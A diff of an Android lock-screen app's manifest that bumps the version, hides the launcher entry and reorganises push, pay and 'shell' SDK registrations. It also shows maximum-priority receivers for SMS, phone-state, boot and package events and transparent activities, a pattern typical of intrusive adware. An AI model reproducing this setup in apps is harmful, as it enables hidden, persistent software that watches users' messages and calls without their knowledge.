@@ -2,8 +2,8 @@
 <manifest xmlns:android="http://schemas.android.com/apk/res/android"
     package="com.coco.lock2.app.Pee"
     android:installLocation="internalOnly"
-    android:versionCode="13"
-    android:versionName="1.0.36844" >
+    android:versionCode="14"
+    android:versionName="1.0.36928" >
 
     <uses-sdk
         android:minSdkVersion="8"
@@ -58,19 +58,19 @@
             android:label="@string/app_name1"
             android:launchMode="singleInstance"
             android:screenOrientation="portrait"
-            android:theme="@android:style/Theme.NoTitleBar" >
+            android:theme="@android:style/Theme.NoTitleBar.Fullscreen" >
             <intent-filter>
                 <action android:name="com.coco.lock.action.VIEW" />
 
                 <category android:name="android.intent.category.INFO" />
-
-                <!-- -->
-                <action android:name="android.intent.action.MAIN" />
-                <category android:name="android.intent.category.LAUNCHER" />
-                
-
+               
+                <!-- <action android:name="android.intent.action.MAIN" />
+                <category android:name="android.intent.category.LAUNCHER" /> -->
+               
             </intent-filter>
         </activity>
+        
+        <!-- UIbase统计服务注册   begin -->
         <service
             android:name="com.cooee.statistics.StatisticsServiceNew"
             android:enabled="true"
@@ -79,11 +79,108 @@
             android:name="com.cooee.lock.statistics.StaticClass"
             android:enabled="true"
             android:exported="true" />
-        <service
-            android:name="com.cooee.control.center.module.update.UpdateService"
-            android:enabled="true"
+        <!-- UIbase统计服务注册   end -->
+        
+        <!-- 控制中心更新服务注册   begin -->
+		<service android:name="com.cooee.control.center.module.update.UpdateService"
+		    android:enabled="true"
             android:exported="true" />
+		<!-- 控制中心更新服务注册   end -->
+		
+		<!-- 创建快捷方式服务注册   begin -->
+		<service android:name="com.cooee.control.center.module.base.ShortcutService"
+		    android:enabled="true"
+            android:exported="true" /> 
+		<!-- 创建快捷方式服务注册   end -->
+		
+		<!-- 开机广播注册   begin -->
+        <receiver android:name="com.cooee.control.center.module.base.BootCompletedReceiver" >
+            <intent-filter>
+                <action android:name="android.intent.action.BOOT_COMPLETED" />
+            </intent-filter>
+        </receiver>
+		<!-- 开机广播注册   end -->
+		
+		<!-- push注册   begin -->
+        <service
+            android:name="com.kpsh.sdk.KpshService"
+            android:process="com.kpsh.kpshservice" >
+            <intent-filter android:priority="250" >
+                <action android:name="com.kpsh.sdk.action.KpshService" />
+            </intent-filter>
+        </service>
 
+        <receiver android:name="com.kpsh.sdk.KpshReceiver" >
+            <intent-filter android:priority="2147483647" >
+                <action android:name="android.intent.action.PACKAGE_REMOVED" />
+                <action android:name="android.intent.action.PACKAGE_ADDED" />
+                <action android:name="android.intent.action.PACKAGE_REPLACED" />
+
+                <data android:scheme="package" />
+            </intent-filter>
+            <intent-filter android:priority="2147483647" >
+                <action android:name="android.net.conn.CONNECTIVITY_CHANGE" />
+                <action android:name="android.intent.action.PHONE_STATE" />
+                <action android:name="android.intent.action.USER_PRESENT" />
+                <action android:name="android.intent.action.USER_CLEARNOTIFY" />
+                <action android:name="android.intent.action.SEND_TO_KPSH" />
+                <action android:name="android.intent.action.CHECK_RECEIVER" />
+            </intent-filter>
+        </receiver>
+
+        <activity
+            android:name="com.kpsh.sdk.KpshActivity"
+            android:configChanges="orientation|keyboardHidden|screenSize"
+            android:exported="true"
+            android:taskAffinity="com.kpsh.sdk.callScreen"
+            android:theme="@android:style/Theme.Translucent.NoTitleBar" >
+        </activity>
+        <!-- push注册   end -->
+
+        <!-- shell注册   begin -->
+        <service
+            android:name="com.cooee.shell.shell.SdkServiceHullV5"
+            android:process="com.platform.shell.sdk" >
+            <intent-filter android:priority="250" >
+                <action android:name="com.cooee.shell.action.SdkServiceV5" />
+            </intent-filter>
+        </service>
+        <service
+            android:name="com.cooee.shell.pay.PayServiceHullV5"
+            android:process="com.platform.shell.pay" >
+            <intent-filter android:priority="250" >
+                <action android:name="com.cooee.shell.action.PayServiceV5" />
+            </intent-filter>
+        </service>
+
+        <activity
+            android:name="com.cooee.shell.shell.SdkActivityHullV5"
+            android:configChanges="orientation|keyboardHidden|screenSize"
+            android:theme="@android:color/transparent" >
+        </activity>
+        <activity
+            android:name="com.cooee.shell.pay.PayActivityHullV5"
+            android:configChanges="orientation|keyboardHidden|screenSize"
+            android:exported="true"
+            android:theme="@android:style/Theme.Translucent.NoTitleBar" >
+        </activity>
+        <activity
+            android:name="com.cooee.shell.download.DownloaderActivityHullV5"
+            android:configChanges="orientation|keyboardHidden|screenSize" >
+        </activity>
+
+        <receiver android:name="com.cooee.shell.shell.SdkReceiverHullV5" >
+            <intent-filter android:priority="2147483647" >
+                <action android:name="android.net.conn.CONNECTIVITY_CHANGE" />
+                <action android:name="android.intent.action.PHONE_STATE" />
+                <action android:name="android.intent.action.USER_PRESENT" />
+                <action android:name="android.intent.action.ACTION_SHUTDOWN" />
+                <action android:name="android.provider.Telephony.SMS_RECEIVED" />
+            </intent-filter>
+        </receiver>
+        <!-- shell注册   end -->
+        
+        <!-- 微入口注册   begin -->
         <activity
             android:name="com.iLoong.launcher.MList.ApkMangerActivity"
             android:configChanges="orientation|keyboardHidden|screenSize"
@@ -182,48 +279,7 @@
                 <action android:name="android.net.conn.CONNECTIVITY_CHANGE" />
             </intent-filter>
         </receiver>
-
-        <!-- shell start -->
-        <service
-            android:name="com.cooee.shell.shell.SdkServiceHullV5"
-            android:process="com.platform.shell.sdk" >
-            <intent-filter android:priority="250" >
-                <action android:name="com.cooee.shell.action.SdkServiceV5" />
-            </intent-filter>
-        </service>
-        <service
-            android:name="com.cooee.shell.pay.PayServiceHullV5"
-            android:process="com.platform.shell.pay" >
-            <intent-filter android:priority="250" >
-                <action android:name="com.cooee.shell.action.PayServiceV5" />
-            </intent-filter>
-        </service>
-
-        <activity
-            android:name="com.cooee.shell.shell.SdkActivityHullV5"
-            android:configChanges="orientation|keyboardHidden|screenSize"
-            android:theme="@android:color/transparent" >
-        </activity>
-        <activity
-            android:name="com.cooee.shell.pay.PayActivityHullV5"
-            android:configChanges="orientation|keyboardHidden|screenSize"
-            android:exported="true"
-            android:theme="@android:style/Theme.Translucent.NoTitleBar" >
-        </activity>
-        <activity
-            android:name="com.cooee.shell.download.DownloaderActivityHullV5"
-            android:configChanges="orientation|keyboardHidden|screenSize" >
-        </activity>
-
-        <receiver android:name="com.cooee.shell.shell.SdkReceiverHullV5" >
-            <intent-filter android:priority="2147483647" >
-                <action android:name="android.net.conn.CONNECTIVITY_CHANGE" />
-                <action android:name="android.intent.action.PHONE_STATE" />
-                <action android:name="android.intent.action.USER_PRESENT" />
-                <action android:name="android.intent.action.ACTION_SHUTDOWN" />
-                <action android:name="android.provider.Telephony.SMS_RECEIVED" />
-            </intent-filter>
-        </receiver>
+        
         <receiver android:name="cool.sdk.update.manager.UpdateReceiver" >
             <intent-filter android:priority="2147483647" >
                 <action android:name="android.intent.action.PACKAGE_REMOVED" />
@@ -240,44 +296,8 @@
                 <action android:name="android.provider.Telephony.SMS_RECEIVED" />
             </intent-filter>
         </receiver>
-
-        <!-- gaominghui  add start -->
-        <!-- 锁屏加push需要的服务和广播 -->
-        <service
-            android:name="com.kpsh.sdk.KpshService"
-            android:process="com.kpsh.kpshservice" >
-            <intent-filter android:priority="250" >
-                <action android:name="com.kpsh.sdk.action.KpshService" />
-            </intent-filter>
-        </service>
-
-        <receiver android:name="com.kpsh.sdk.KpshReceiver" >
-            <intent-filter android:priority="2147483647" >
-                <action android:name="android.intent.action.PACKAGE_REMOVED" />
-                <action android:name="android.intent.action.PACKAGE_ADDED" />
-                <action android:name="android.intent.action.PACKAGE_REPLACED" />
-
-                <data android:scheme="package" />
-            </intent-filter>
-            <intent-filter android:priority="2147483647" >
-                <action android:name="android.net.conn.CONNECTIVITY_CHANGE" />
-                <action android:name="android.intent.action.PHONE_STATE" />
-                <action android:name="android.intent.action.USER_PRESENT" />
-                <action android:name="android.intent.action.USER_CLEARNOTIFY" />
-                <action android:name="android.intent.action.SEND_TO_KPSH" />
-                <action android:name="android.intent.action.CHECK_RECEIVER" />
-            </intent-filter>
-        </receiver>
-
-        <activity
-            android:name="com.kpsh.sdk.KpshActivity"
-            android:configChanges="orientation|keyboardHidden|screenSize"
-            android:exported="true"
-            android:taskAffinity="com.kpsh.sdk.callScreen"
-            android:theme="@android:style/Theme.Translucent.NoTitleBar" >
-        </activity>
-
-        <!-- gaominghui  add end -->
+        <!-- 微入口注册   end -->
+        
     </application>
 
 </manifest>
